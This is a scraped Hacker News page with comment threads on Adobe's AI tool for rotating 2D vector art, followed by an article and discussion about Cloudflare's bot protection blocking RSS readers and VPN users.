get in my way at all. reply Arainach 2 hours agorootparentIt's popups. It's emails. It's constant nudges towards changes in workflows. Most importantly, it's accelerated the slurping of data and aggressive terms of service by an order of magnitude. Sure, in theory everyone wanted your data before, but now everyone wants all your data all the time. They want to upload it to their servers. They want to train products on it. And they want to ban you from using their product if you don't agree. reply achow 4 hours agoprevThe source (Adobe MAX) 'demoes' full range of incredible scenarios.. https://www.youtube.com/watch?v=gfct0aH2COw reply xnx 3 hours agoparentThe video is much better than the linked page. The video shows the dynamic multi-angle character rotation and other object rotations. https://www.youtube.com/watch?t=63 reply jervant 2 hours agorootparentThat event has the enthusiasm of old Apple demos reply jobigoud 1 hour agorootparentprevMaybe you missed the video in the linked article? it's the same demo. reply xnx 1 hour agorootparentCut out the middle-man. reply jampekka 4 hours agoparentprevNot bad, but what's up with the audience? Is there an Adobe cult or something? reply laborcontract 3 hours agorootparentRegardless of whether these are adobe employees or not, I’d argue that a feature like this warrants such a response. It makes me miss Apple’s old keynote style that they’ve abandoned in favor of the bland, sanitized, over-polished and pre-recorded video keynotes. I’m honestly over so much of the corporate cynicism and Blind-indification that’s turned what was once a necessary precautionary stance to this demonization or ridicule of people who happen to love their work and where they do it. reply mesh 3 hours agorootparentThe audience is creative community members who use Adobe tools and are attending max (around 11,000 for this event). reply mesh 3 hours agorootparentprevThis is Adobe Max, which is a huge event held by Adobe for creators. This session is \"Sneaks\" which is held every year, and has a fun, casual atmosphere. i.e. it has a theme, has a celebrity co-host, lots of jokes, food and drink served, etc... Its basically a bunch of people who are creative, and are having fun nerding out on the tech... Its a lot of fun. (I work for Adobe) reply dylan604 4 hours agorootparentprevOf course there is. Just like there's an Apple Cult, Android Cult, Facebook Cult, Sportsball team cult, blah blah blah. Any group that is large enough to attract that many users/followers/fans will naturally have a subset that is more gungho than the rest. reply allenu 3 hours agorootparentprevI'm not sure about this particular event, but companies often have employees who worked on the products in the crowd during launches to provide even more crowd noise. reply smallerfish 2 hours agorootparentprevAlso the \"fun\" stage setting. I once quit a big-ish tech company when they started pulling stuff like that. reply dagmx 3 hours agorootparentprevThere’s millions of Adobe product users out there. Almost all the design tool developers have keynote events. As an aside, I hate that people like yourself describe fans of anything they don’t personally understand as cults. It’s an antagonistic framing of a question designed to remove any good faith discussion. reply emsign 2 hours agorootparentI think cult is really fitting for a massive group of customers who are locked in by a monopolist. Maybe eve; worse than a cult, because there's just the one, reply achow 3 hours agorootparentprevCome on.. it is literally dream come true for an artist whose nightmare is indecisive, confused clients. You have to read some of the YouTube comments to understand that some of those hoots and claps could be for real. reply reaperducer 2 hours agorootparentprevNot bad, but what's up with the audience? Is there an Adobe cult or something? There are conferences for Adobe customers to teach them how to use Adobe tools. I think there was recently an Adobe Max conference in Los Angeles. It could have been filed there. reply renewiltord 33 minutes agorootparentprevIt's an immense feature. Illustrators love it. Of course they're enthusiastic about it. Man, there's nothing like this. You draw 2D vector art and then rotate it in 3D space. What the heck, that's freaking crazy. I'd be hooting and hollering. How can you not be losing your mind over this. It would accelerate so many processes. My wife's an artist and says they had a shitty version of this but this is crazy. reply pier25 2 hours agoparentprevFinally more AI tools for vectors! With bitmaps you get a blob of pixels but vectors you can be edited and refined much easier. reply porphyra 3 hours agoprevI find that Adobe is really pulling away from open source software with all this AI stuff. A few years ago it could be argued that GIMP, Inkscape, and Darktable could do almost everything that Photoshop, Illustrator, and Lightroom could, albeit with a jankier user interface. But now none of the open source software can compete with AI generative fill, AI denoising, and now AI rotation. reply CapsAdmin 2 hours agoparentIn some way, having followed the open source image generation scene for a while, it feels a little bit like it's opposite? Most of the ai image generation stuff I've seen from adobe feels late to party in terms of what you can do with open source tools. Where they do compete however is with tight integration, and I guess that's what matters the most to users in the end. There are plugins for gimp that let you do image generation, inpainting and other things. As far as what the post shows, it looks very much like current models that generate novel viewpoints of an object, but for illustrations. It might be doable to fine tune this for illustrations and simply vectorise the new viewpoint again. Though this will destroy any structure previously held in the object. All I'm saying is that we have the tech to do even more than what adobe is doing, we just haven't put it nicely together yet. reply NeroVanbierv 2 hours agorootparentI think your last paragraph sums it up pretty nicely: users need a good UX to get to these tools. So I would love if GIMP started shipping these awesome plugins by default to pick up the pace! reply Waterluvian 2 hours agorootparentThe more I spend time as a software developer, the more strongly I believe that UX is 80% of what makes a tool good, and that a lot of programmers really just don’t get that. reply dylan604 2 hours agorootparentThere are also the programmers that do get that, but just don't have the ability to change it. I'm no artist, but I can tell you when something looks bad. I'm constantly playing with CSS to learn new things to make things look better. I'm now in that category of \"it looks like someone tried but just didn't achieve, but better than most\" level of design. Programmers making things for other programmers will always be forgiven as long as it works. Programmers making things for the general population will not be forgiven to the same extent if at all. As soon as someone releases something that is polished, it will be used even if it doesn't work as well. reply gjsman-1000 2 hours agorootparentprevGIMP does not fully support non-destructive editing yet. That, by itself, would be a complete deal breaker for professional work. There's plenty more deal breakers remaining. reply ceejayoz 3 hours agoparentprevThey'll probably be better able to compete once Adobe ups prices to reflect the actual cost of all that processing. reply pbhjpbhj 3 hours agorootparentPhotoshop is £30 a month. NASDAQ.com reports their net profit to be 40% and elsewhere they're reported to gross $20B revenue. I think they can afford the ML based content generation costs without increasing prices. reply egypturnash 2 hours agorootparentThey might do it anyway though. I have the \"all apps\" subscription but it's not actually everything they make any more, all their \"Substance 3D\" tools are another $50/mo. I can easily see this feature getting most of its functionality locked behind that extra subscription the way Illustrator's new 3d tools just give you a tiny handful of materials without that. reply pbhjpbhj 2 hours agorootparentOh for sure, their implementation is slicks and they're somewhat of a monopolist. The whole \"free to educational institutions\" really worked well for them and MS. I don't doubt they will put prices up, just boring they don't need to. reply mr_machine 3 hours agoparentprevI was just thinking similarly. I don't need any of these AI features and I'm certainly not about to start giving Adobe money, but I'd be lying if I said I wasn't jealous. reply RustySpottedCat 3 hours agoparentprevNot yet, but I imagine soon they will. Closed source is moving to video and open source is catching up to static images with incredible pace. I won't be suprised if not only GIMP integrates something like a couple of general stable diffusion models but pirated copies of photoshop find a way to hook up a local generative model instead of the online stuff. reply jerf 2 hours agoparentprev\"But now none of the open source software can compete with AI generative fill, AI denoising, and now AI rotation.\" This is a common pattern across many fields. The truly top-end companies are always running ahead of open source. But that doesn't mean it's a permanent situation. It just means you're looking at it from a point in time where the commercials got there, and open source hasn't yet. Open source will get there, and then Adobe will be ahead on something else. I've played a bit with \"comfyui\" over the past few days, a bizarre name for an AI image generation power tool. (And other things, but I have no experience there to know how good it is at those.) It drips with power. The open source world is not generally behind on raw capability. As is often the case, open source's deficiency for generative fill for instance is that A: it offers too much control, too many knobs (e.g., \"which of several dozen models would you like to start with?\"), and while that's awesome if you know what you're doing, it is not yet at the \"circle this and click 'remove'\" yet, and B: the motivation and firepower to integrate this all into a slick package is not there. I can definitely do an AI generative fill with open source software, but I'll be exporting an image into comfyui, either building my own generative fill program or grabbing some rando's program online who may or may not be using compatible models or require me to install additional bespoke functionality into comfyui, doing my work, and re-exporting it. The job is done, but it's much more complicated, and most people don't care about the other extra capabilities this workflow yields so for them it's just cost. It's a very normal pattern in the open source world. Nothing about the current situation particularly gives me cause to worry specially about it. To be concrete, here's a YouTube video that's to the more advanced side of what you can do in the open source world, which is probably still ultimately simplistic compared to what some people do: https://www.youtube.com/watch?v=ijqXnW_9gzc That entire series is worth a look, and there's more it doesn't cover. You can get incredible control over these tools in the open source world, but it involves listening to some guy on YouTube trying to explain why you might to sometimes use a thing called \"dpmpp_2m_sde_gpu\"... not exactly normie-friendly. reply lofaszvanitt 1 hour agoparentprevThey can, but the user experience is abysmal, useless and nerve racking. reply insane_dreamer 1 hour agoparentprevCan't speak for PS vs GIMP but I used to use Illustrator a fair bit and Inkscape was nowhere near it in terms of both features and useability. Now that was 15 years ago, so it may have caught up. reply horsawlarway 2 hours agoparentprevI'm not convinced. The flows are a little less convenient right now, but that's basically it. Ex - I can absolutely get exactly this same rotation feature using open toolchains, they just haven't been nicely consolidated into a pretty package yet. So to recreate the same thing adobe is doing here I currently have to: 1. Use the 3d-pack in comfy-ui to get stack orbit camera poses for my char (see: https://github.com/MrForExample/ComfyUI-3D-Pack scroll down to stack orbit in the readme) 2. Import those images back into the open source tool manually. Is it as convenient? Nope - it requires a lot more setup and knowledge. Is it hard to imagine this getting implemented in open source? Also nope. It's going to happen, it just won't be quite as quick. reply gjsman-1000 3 hours agoparentprev> A few years ago it could be argued that GIMP, Inkscape, and Darktable To a Linux user, yes. To a professional, it was always a cruel joke, it was never close, even a few years ago. It's like saying Notepad++ is a functional IDE, or Kdenlive is a functional replacement for DaVinci Resolve. I cannot stress this enough: Actual professionals do not think GIMP is a viable replacement, in any way, and never have. reply gjsman-1000 2 hours agorootparentI would also like to add (as a separate comment though, this will be controversial): Some would say that GIMP, Inkscape, and Darktable aren't really competitive yet because they haven't had enough investment. If we invested in them enough, and managed them well, they could be like Blender. GIMP has been in development since 1995. Photopea was initially released in 2013, has been solely developed by one person, and is a far-and-away better Photoshop competitor. The projects themselves are mismanaged. GIMP should (frankly) be abandoned and completely reset, in my opinion, as being a failed attempt at salvaging old code forever. Wisdom is knowing when to keep pushing - and when to give up. reply qwertox 2 hours agoprevIf you rmb-click on the video and select \"show controls\", you will not only be able to seek, but you'll also be able to unmute it. I don't know why it was embedded with the controls hidden. reply cloudking 4 hours agoprevThis is the true power of generative AI, enabling new functionality for the user with simple UX while doing all the heavy lifting in the background. Prompting as a UX should be abstracted away from the user. reply jprete 3 hours agoparentThis probably isn't backed by an LLM but instead some kind of geometric shape model. reply m3kw9 2 hours agorootparentHow do you explain a horse 2 legs become 4 legs when rotated assuming they only drew 2 legs on the side view reply atq2119 2 hours agorootparentThe second L in LLM stands for \"language\". Nothing of what you're describing has to do with language modeling. They could be using transformers, sure. But plenty of transformers-based models are not LLMs. reply kubrickslair 2 hours agorootparentThey are probably looking for LGMs - Large Generative Models which encapsulate vision & multi-modal models. reply schnebbau 4 hours agoprevIncredible, but a shame you'll have to use Adobe to get it. reply nakedrobot2 2 hours agoparentYes. I absolutely despise Adobe, and I will not be using this. They were double charging me for photoshop for two years. I caught them and it took 60 minutes on the phone to get them to do something about it. They have an entire cancellation department. (!) reply tombert 3 hours agoprevI spent so many hours trying to do rotations with a pirated copy of Flash as a kid, and I never really got the hang of it, and it always bothered me how deceptively hard rotation was; when I would show my parents my work, they would do their very best to try and act excited but I could tell that they weren't really impressed with the effort because it doesn't seem that hard, at least to a lot of people. This makes me irrationally happy. reply stavros 2 hours agoparentYeah, this is one of those things that seems trivial until you try to do it, and then it's impossible. reply AbraKdabra 1 hour agoprevOk that's VERY impressive, now give me the possibility of exporting it as an .stl to 3D print and then we'll be talking. Just imagine drawing something in 2D and be able to print it as a fully 3D object, it gives me chills just by thinking about it. reply rcarmo 2 hours agoprevAs someone who currently works in GenAI and analytics but paid their way through college doing design (for print media) and still keeps around old copies of Illustrator and Fireworks (running under Wine) as well as using Affinity Suite, this is STUPEFYINGLY more impressive than any LLM. Still not enough to make me pay for Adobe Creative Suite (I just dabble these days), but the target demographic will be all over it. reply ilaksh 1 hour agoprevThere are actually multiple open source ML models for 2d to 3d which is clearly what they are doing. The difference with most of them is that this is vectors. There might actually be a similar open source model already. But I think to create it you would build it from a database of 3d assets that you could render from many angles. Probably quite similar to the way the 2d to 3d works. I don't know maybe the typical 2d to 3d models will work out of the box or with some kind of smoothing or parameterization. Maybe if you have a large database of parameterized 3d models then you combine that with rendering in 2d from different angles then you can basically use the existing 2d to 3d model. https://replicate.com/collections/3d-models reply seattleeng 25 minutes agoprevpreserving the vector art after transforming is really cool, anyone know the relevant papers? or was this original research done by Adobe? reply andrewstuart 8 minutes agoprevBetter link with working video: https://www.adobe.com/max/2024/sessions/project-turntable-gs... reply trox 2 hours agoprevThis looks very cool. I really hope the results are not overly cherry-picked like Adobe's first version of the text-to-vector generation that only worked particularly well for the showcased art styles. reply coldcode 1 hour agoparentI won't be excited until its live in an app, company demos are always exciting. reply dsign 1 hour agoprevWell, when is so big bad company going to bully us into using their tools to convert 3D sculpts into flawlessly animatable models? I'll submit to their abuse and surrender my lunch money to them. Though not if it is Adobe, I still have some self-love. reply _qua 2 hours agoprevGood idea, but such a frustrating company to do business with as a consumer reply Bjorkbat 1 hour agoprevAs someone who otherwise hates genAI, I must admit, this is actually a very cool demo and a very sensible application of AI. reply simpaticoder 3 hours agoprevThis captures the essence of what \"modern AI\" is great at! Relieving the tedium of a highly constrained task. Great demo. This will really help animators and artists. reply dweekly 2 hours agoprevI found the Project Turntable page on Adobe's site more interesting (with embedded video) on mobile than the linked CreativeBloq site: https://www.adobe.com/max/2024/sessions/project-turntable-gs... reply nullandvoid 1 hour agoprevHow very strange, my partner was mocking up a room for our home just a few hours ago, and I asked whether an AI tool existed to rotate the incorrect angle of a sofa in a photo being used within the mock up - and here it is on hackernews just an hour later, just that tool.. Edit/ apparently I misunderstood it's only possible with vectors - getting close though to the reality mentioned! reply SirMaster 3 hours agoprevLooks like Adobe finally found a way to cut down on piracy. None of these new AI features will work on a pirated copy because it's all server-side processing. reply PaulHoule 3 hours agoprevMakes me think of https://lookingglassfactory.com/looking-glass-go-spatial-pho... which needs multiple views of your image from different angle and tries to make it up with AI. reply o1o1o1 41 minutes agoparentDoes anybody know a DIY solution to get a similar result? I am asking because 300$ seems like a lot of money for this. reply changing1999 2 hours agoprevIt took me a while to understand that the second picture is actually a muted video with hidden controls. reply imsaw 4 hours agoprevI thought this was one of those sarcastic headlines, highlighting the overuse of AI for basic processes. reply vivzkestrel 1 hour agoprevhaven't been in the loop for a while, stupid question: why do people hate adobe reply dsign 1 hour agoparentNot a graphic designer, so I can't speak for their reasons, only for mine. First, I had a photoshop subscription and when I cancelled they wanted to fine me for cancelling. Then they bought the Substance suite and made it subscription only and very expensive (unless you buy the Steam version, whose price they doubled). That also hurt me, when I could barely afford those tools I'm better off now, but I have a long memory and prefer to vote with my wallet by paying multiples to any competitor...which generally speaking is better for me and everybody else, since competition is the mother of innovation. Apropo, Marmoset Toolbag 5 is out; it comes with a permanent license, it has a huge materials library, and the interface is very snappy and it doesn't feel like it has been programmed using Electron. You don't need to pay for Substance Painter this year. Ah, and Adobe's latest exploit was a confusing TOS that more or less stated they would use your work that you edited locally with their software to train their AI models. I think they walked that one back when the wave of outrage hit them. reply sharpshadow 4 hours agoprevAmazing this will give ancient GIFs a facelift. reply zeroXeng 3 hours agoparentso, pacman will have 3 D characters now ? reply joelfried 1 hour agorootparentYes, Ms. Pacman has the DDs, which is why PacMan himself gives her the D. 3 Ds. reply worksonmine 2 hours agoprevCame here assuming they were using AI for \"rotate 90°\" ready to drop a rant, but this was actually impressive. reply hackitup7 2 hours agoparentI had a similar negative reaction to the grandiose title but in this case it was totally deserved and I am pretty blown away. reply 999900000999 2 hours agoprevI want the actual 3D models. This looks like the perfect tech for a cel shaded game! reply hprotagonist 4 hours agoprevNeRF or gaussian splatting? reply porphyra 3 hours agoparentI don't think either of those would work with a single 2D vector image. reply ralusek 4 hours agoprevPretty incredible reply jprd 4 hours agoparentCompletely agree. I thought this was going to be some underwhelming nonsense, but that is legit impressive and something even a non-artist could benefit from. reply CSMastermind 4 hours agorootparentArguably non-artists benefit the most. This is a time saver for skilled artists but a whole new ability unlock for the unskilled ones. reply SoftTalker 3 hours agorootparentThis is basically like taking your 2D drawing to an artist and saying \"draw this for me from different angles.\" Only now the artist is a computer, and probably costs you a lot less than paying a real artist every time you want to do this. Animators are even more out of a job I guess, but really have been for quite some time I think, almost no animation is entirely hand-drawn anymore. reply meebob 1 hour agorootparentA large amount of animation made in Japan is still initially animated by hand on paper, actually! The anime industry is remarkably conservative, technologically, which makes it all the more impressive that its animation production output dwarfs that of most other places, including ones that have largely switched over to 3D or puppet rigging for animation productions... reply mywacaday 4 hours agorootparentprevI was going to write how this would be cool in a kids drawing app but the thought that they might never feel the need to draw something from a different angle. I wonder what other activities have been lost to time and technology. reply 082349872349872 4 hours agorootparent> what other activities have been lost to time and technology - flintknapping - the distaff activities: carding, spinning, weaving, etc. - \"teamster\" as a very highly skilled occupation EDIT: compare https://www.youtube.com/watch?v=JD2ua6q8FFA&t=475s with https://www.youtube.com/watch?v=gjZX6L5cnUg&t=11s reply KaoruAoiShiho 3 hours agorootparentprevSocrates was against the invention of writing because it meant people lost the skill to memorize and recite https://www.historyofinformation.com/detail.php?id=3439 reply pessimizer 3 hours agorootparentIt really has been destructive. He anticipated the day in which you could change people's memories by editing the internet. reply SoftTalker 3 hours agorootparentprevDepends on whether the kid wants to learn to draw, or just wants to create drawings. reply ceejayoz 3 hours agorootparentprevI'd love to see what this tool does with bad drawings, heh. reply kccqzy 3 hours agorootparentprevWhy might a kid not want to draw something from a different angle? In my introduction to drawing course I was asked to draw my non-dominant hand every day for a week, each time from a slightly different angle. reply Vegenoid 2 hours agorootparentBecause instead of doing that, they could have the computer rotate their drawing to a new angle. reply wslh 2 hours agoprevI am sure this is the right time for hobbysts to make your own movies, and animations. I personally started programming, in part, to make simple animations like the ones you see in Scratch, and it’s incredible how accessible the tools are today for anyone looking to bring their ideas to life. reply riiii 3 hours agoprevI'm pretty tired seeing AI slapped on everything but holy shit this is impressive. reply m3kw9 1 hour agoprevone thing is you can't be lazy when drawing the initial vector like a car for example, you can't just draw from the top and expect it to generate a side shot after rotating. You need to draw maybe an isometric version first. reply alfiedotwtf 4 hours agoprevSIGGRAPH from over a decade ago has entered the chat... https://www.youtube.com/watch?v=Oie1ZXWceqM It may not be AI, but this single video blew my mind back in *2013* and I find myself thinking about it often. reply emmanueloga_ 2 hours agoparentThe video you shared very much looks deserving of the 'AI' label to me. Perhaps you mean it doesn't use some of the techniques driving the current AI boom, like LLMs or diffusion models. reply imranq 3 hours agoparentprevThis is great -- I'm always amazed how effective classical algorithms are at doing so-called \"neural tasks\". What's strange is how few SIGGRAPH tech ever makes it out as a consumer product reply leviathant 1 hour agoparentprev>SIGGRAPH from over a decade ago has entered the chat... > >https://www.youtube.com/watch?v=Oie1ZXWceqM A version of this was available in Photoshop for a long time, but I think the feature was deprecated and removed completely this year. I had used it for a few things here and there, but dedicated 3D tools were much better if you were working in that space. reply alexashka 3 hours agoprev [–] People have been using 3D models for 2D graphics for at least a decade. 3D models rotate, by default. This demo shows generating a 3D model from a simple 2D shape. It'll fall flat on its face trying to 3D model anything non-trivial which begs the question - who cares? Also, you'll want to animate the 3D model - which this doesn't do, so you'll soon be back to your usual 3D toolkit anyway. reply egypturnash 3 hours agoparentThis is in a wholly 2D program. The input is implied to be one completely flat vector drawing, which Illustrator turns into a 3d model, and renders back into flat vectors at multiple rotations, with no further work on the part of the artist. (I say \"implied\" because that's all they're showing in the video presentation, there may be additional setup involved that they're skipping. This is inside Illustrator though, which has a long history of 3d extensions being very awkwardly shoved into a corner of its toolset.) reply fooker 3 hours agoparentprev [–] The difference is that you don't need a 3D model for this. You start with 2D vector graphics that is significantly easier to create. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Adobe introduced 'Project Turntable' at the MAX conference, an AI-driven tool that enables users to rotate 2D vector art in 3D while preserving its 2D look.",
      "The tool can intelligently fill in missing details, such as adding legs to a horse when the image is rotated, showcasing advanced AI capabilities.",
      "Adobe has unveiled over 100 new features this week, highlighting a significant leap in AI technology, though it's unclear if 'Project Turntable' will be commercially available."
    ],
    "commentSummary": [
      "Adobe has introduced a new AI image rotation tool that allows 2D vector graphics to be rotated in 3D space, addressing practical user needs.",
      "The tool is praised for its innovation, contrasting with other tech companies that often focus on AI for investor appeal rather than user benefit.",
      "Despite some criticism of Adobe's business practices, the tool is considered a smart move, particularly beneficial for illustrators, emphasizing the balance between innovation and user-centric design in AI development."
    ],
    "points": 440,
    "commentCount": 163,
    "retryCount": 0,
    "time": 1729175478
  },
  {
    "id": 41864632,
    "title": "Using Cloudflare on your website could be blocking RSS users",
    "originLink": "https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users",
    "originBody": "Using Cloudflare on your website could be blocking RSS users October 16, 2024 Many users prefer to use an RSS feed reader to stay up to date with the content on the websites they visit. But if you've enabled Cloudflare on your website, you're likely blocking these RSS users from accessing your website content without realizing it. The Cloudflare features that block RSS readers In Cloudflare's dashboard, you'll find tools designed to block bot traffic to your website. Particularly, the Bot Fight Mode and block all \"AI scrapers and crawlers\" options below. When enabled, these features end up blocking users who access your website through RSS readers, even though RSS readers are legitimate and aren't malicious bots. A screenshot of Cloudflare's Bot Fight Mode and block all \"AI scrapers and crawlers\" features that block RSS readers from accessing a website How Cloudflare blocks RSS readers from your website When enabling the tools, Cloudflare will evaluate each visit to your website and determine whether the visit is from an AI scraper or \"bot\" based on a score , which ironically Cloudflare uses AI to generate. Then, when a user's RSS reader attempts to read your website, Cloudflare presents it with a number of challenges that the reader would never be able to fulfill. Here's an example of the Human Verification challenge that an RSS reader would be shown when it tries to visit your website. The challenge requires a human to solve and, because an RSS reader is not a human, it can never complete them. In other cases, Cloudflare will simply block the RSS reader from accessing your website without a reason. The only way to resolve when Cloudflare blocks an RSS reader from accessing your website is by contacting you directly and asking you to make a custom rule to unblock it. But Cloudflare shouldn't expect people to contact every owner of every Cloudflare website that blocks their RSS reader. And you shouldn't have to waste time logging into Cloudflare to add an exception every time they block an RSS reader, either. Unblock RSS readers while still using Cloudflare Even though Cloudflare blocks RSS readers from your website, you can whitelist RSS readers as a workaround. This would at least unblock RSS readers without having to turn off any security features that you may have already been enabled until Cloudflare better addresses the issue. First, find the user agent of any blocked RSS reader in Cloudflare's analytics dashboard. The User-Agent of most good RSS readers usually include the name of the reader, it's URL, or a word like \"RSS\" or \"feed\" that makes it obvious that it's an RSS reader. Once you've identified an RSS reader's user agent, you can create a custom rule that explicitly whitelists and allows all traffic by the reader's IP address or by it's user agent string. Note that user agents can be disguised, so it's often better to whitelist the reader's IP address instead of the user agent. If you'd like to whitelist Open RSS, please contact us for the required information. Cloudflare needs a better way to allow RSS readers Cloudflare offers a bot verification program to which RSS readers owners can manually apply to avoid being blocked by websites, but this program isn't guaranteed to work and it suffers from quite a few problems. The verification process is flimsy — They're using a Google form for applications to the program. Then after applying, no notification is sent that they're working on it or even received the application successfully (we've tried applying twice), with no progress updates or expected timeframe for completion. Verified RSS readers are still being blocked — There are reports that RSS readers Cloudflare has verified as \"good bots\" are still being blocked from websites. If Cloudflare has successfully approved an RSS reader as a \"good bot\", it shouldn't be blocked or still require website owners to add any custom exception rules. Unblocking RSS readers across multiple websites is cumbersome — Cloudflare's only resolution to unblocking RSS readers is for the owners of the readers to contact each website owner directly and ask for an exception to be made. While that may work for one-off cases, this is unreasonable for RSS readers that have to access thousands of different Cloudflare-enabled websites each day. It's also overwhelming for website owners to configure exceptions for each and every RSS reader. To be clear, there's nothing wrong with using Cloudflare's security tools on your website to help deal with malicious AI bots, scrapers, and potential attacks. But Cloudflare needs to ensure that people who use RSS tools aren't blocked from accessing your website content, and make it easier to resolve when they are. ❤ Open RSS is a registered 501(c)(3) nonprofit headquartered in the District of Columbia, USA and funded only by voluntary donations of its users. If you enjoy using Open RSS, we'd be so grateful if you'd consider donating to help us grow and continue to provide you with a quality and reliable service.",
    "commentLink": "https://news.ycombinator.com/item?id=41864632",
    "commentBody": "Using Cloudflare on your website could be blocking RSS users (openrss.org)414 points by campuscodi 20 hours agohidepastfavorite195 comments conesus 1 hour agoI run NewsBlur[0] and I’ve been battling this issue of NewsBlur fetching 403s across the web for months now. My users are revolting and asking for refunds. I’ve tried emailing dozens of site owners and publishers and only two of them have done the work of whitelisting their RSS feed. It’s maddening and is having a real negative effect on NewsBlur. NewsBlur is an open-source RSS news reader (full source available at [1]), something we should all agree is necessary to support the open web! But Cloudflare blocking all of my feed fetchers is bizarre behavior. And we’re on the verified bots list for years, but it hasn’t made a difference. Let me know what I can do. NewsBlur publishes a list of IPs that it uses for feed fetching that I've shared with Cloudflare but it hasn't made a difference. I'm hoping Cloudflare uses the IP address list that I publish and adds them to their allowlist so NewsBlur can keep fetching (and archiving) millions of feeds. [0]: https://newsblur.com [1]: https://github.com/samuelclay/NewsBlur reply srik 51 minutes agoparentRSS is an essential component to modern web publishing and it feels scary to see how one company’s inconsideration might harm its already fragile future. One day cloudflare will get big enough to be subject to antitrust regulation and this instance will be a strong data point working against them. reply AyyEye 1 hour agoparentprevThree consenting parties trying to use their internet blocked by a single intermediary that's too big to care is just gross. It's the web we deserve. reply p4bl0 38 minutes agoparentprevI've been a paying NewsBlur user since the downfall of Google Reader and I'm very happy with it. Thank you for NewsBlur! reply wenbin 4 hours agoprevAt Listen Notes, we rely heavily on Cloudflare to manage and protect our services, which cater to both human users and scripts/bots. One particularly effective strategy we've implemented is using separate subdomains for services designed for different types of traffic, allowing us to apply customized firewall and page rules to each subdomain. For example: - www. listennotes.com is dedicated to human users. E.g., https://www.listennotes.com/podcast-realtime/ - feeds. listennotes.com is tailored for bots, providing access to RSS feeds. Eg., https://feeds.listennotes.com/listen/wenbin-fangs-podcast-pl... - audio. listennotes.com serves both humans and bots, handling audio URL proxies. E.g., https://audio.listennotes.com/e/p/1a0b2d081cae4d6d9889c49651... This subdomain-based approach enables us to fine-tune security and performance settings for each type of traffic, ensuring optimal service delivery. reply kevindamm 2 hours agoparentWhere do you put your sitemap (or its equivalent)? Looking at the site, I don't notice one in the metadata but I do see a \"site index\" on the www subdomain, though possibly that's intended for humans not bots? I think the usual recommendation is to have a sitemap per subdomain and not mix them, but clearly they're meant for bots not humans... reply wenbin 2 hours agorootparentGreat question. We only need to provide the sitemap (with custom paths, not publicly available) in a few specific places, like Google Search Console. This means the rules for managing sitemaps are quite manageable. It’s not a perfect setup, but once we configure it, we can usually leave it untouched for a long time. reply amatecha 12 hours agoprevI get blocked from websites with some regularity, running Firefox with strict privacy settings, \"resist fingerprinting\" etc. on OpenBSD. They just give a 403 Forbidden with no explanation, but it's only ever on sites fronted by CloudFlare. Good times. Seems legit. reply wakeupcall 9 hours agoparentAlso running FF with strict privacy settings and several blockers. The annoyances are constantly increasing. Cloudflare, captchas, \"we think you're a bot\", constantly recurring cookie popups and absurd requirements are making me hate most of the websites and services I hit nowdays. I tried for a long time to get around it, but now when I hit a website like this just close the tab and don't bother anymore. reply afh1 7 hours agorootparentSame, but for VPN (either corporate or personal). Reddit blocks it completely, requires you to sign-in but even the sign-in page is \"network restricted\"; LinkedIn shows you a captcha but gives an error when submitting the result (several reports online); and overall a lot of 403's. All go magically away when turning off the VPN. Companies, specially adtechs like Reddit and LinkedIn, do NOT want you to browse privately, to the point they rather you don't use their website at all unless without a condom. reply acdha 6 hours agorootparent> Companies, specially adtechs like Reddit and LinkedIn, do NOT want you to browse privately, to the point they rather you don't use their website at all unless without a condom. That’s true in some cases, I’m sure, but also remember that most site owners deal with lots of tedious abuse. For example, some people get really annoyed about Tor being blocked but for most sites Tor is a tiny fraction of total traffic but a fairly large percentage of the abuse probing for vulnerabilities, guessing passwords, spamming contact forms, etc. so while I sympathize for the legitimate users I also completely understand why a busy site operator is going to flip a switch making their log noise go down by a double-digit percentage. reply rolph 2 hours agorootparentfunny thing, when FF is blocked i can get through with TOR. reply Adachi91 4 hours agorootparentprev> Reddit blocks it completely, requires you to sign-in but even the sign-in page is \"network restricted\"; I've been creating accounts every time I need to visit Reddit now to read a thread about [insert subject]. They do not validate E-Mail, so I just use `example@example.com`, whatever random username it suggests, and `example` as a password. I've created at least a thousand accounts at this point. Malicious Compliance, until they disable this last effort at accessing their content. reply zargon 1 hour agorootparentThey verify signup emails now. At least for me. reply hombre_fatal 2 hours agorootparentprevMost subreddits worth posting on usually have a minimum account age + minimum account karma. I've found it annoying to register new accounts too often. reply immibis 59 minutes agorootparentprevI've created a few thousand accounts through a VPN (random node per account). After doing that, I found out Reddit accounts created through VPNs are automatically shadow banned the second time they comment (I think the first is also shadow deleted in some way). But they allow you to browse from a shadow banned account just fine. reply anthk 5 hours agorootparentprevFor Reddit I just use it r/o under gopher://gopherddit.com A good client it's either Lagrange (multiplatform), the old Lynx or Dillo with the Gopher plugin. reply appendix-rock 7 hours agorootparentprevI don’t follow the logic here. There seems to be an implication of ulterior motive but I’m not seeing what it is. What aspect of ‘privacy’ offered by a VPN do you think that Reddit / LinkedIn are incentivised to bypass? From a privacy POV, your VPN is doing nothing to them, because your IP address means very little to them from a tracking POV. This is just FUD perpetuated by VPN advertising. However, the undeniable reality is that accessing the website with a non-residential IP is a very, very strong indicator of sinister behaviour. Anyone that’s been in a position to operate one of these services will tell you that. For every…let’s call them ‘privacy-conscious’ user, there are 10 (or more) nefarious actors that present largely the same way. It’s easy to forget this as a user. I’m all but certain that if Reddit or LinkedIn could differentiate, they would. But they can’t. That’s kinda the whole point. reply bo1024 6 hours agorootparentNot following what could be sinister about a GET request to a public website. > From a privacy POV, your VPN is doing nothing to them, because your IP address means very little to them from a tracking POV. I disagree. (1) Since I have javascript disabled, IP address is generally their next best thing to go on. (2) I don't want to give them IP address to correlate with the other data they have on me, because if they sell that data, now someone else who only has my IP address suddenly can get a bunch of other stuff with it too. reply hombre_fatal 2 hours agorootparentAt the very least, they're wasting bandwidth to a (likely) low quality connection. But anyone making malicious POST requests, like spamming chatGPT comments, first makes GET requests to load the submission and find comments to reply to. If they think you're a low quality user, I don't see why they'd bother just locking down POSTs. reply zahllos 4 hours agorootparentprevSQL injection? Get parameters can be abused like any parameter. This could be sql, could be directory traversal attempts, brute force username attempts, you name it. reply kam 2 hours agorootparentIf your site is vulnerable to SQL injection, you need to fix that, not pretend Cloudflare will save you. reply miki123211 1 hour agorootparentprev> For every…let’s call them ‘privacy-conscious’ user, there are 10 (or more) nefarious actors that present largely the same way. And each one of these could potentially create thousands of accounts, and do 100x as many requests as a normal user would. Even if only 1% of the people using your service are fraudsters, a normal user has at most a few accounts, while fraudsters may try to 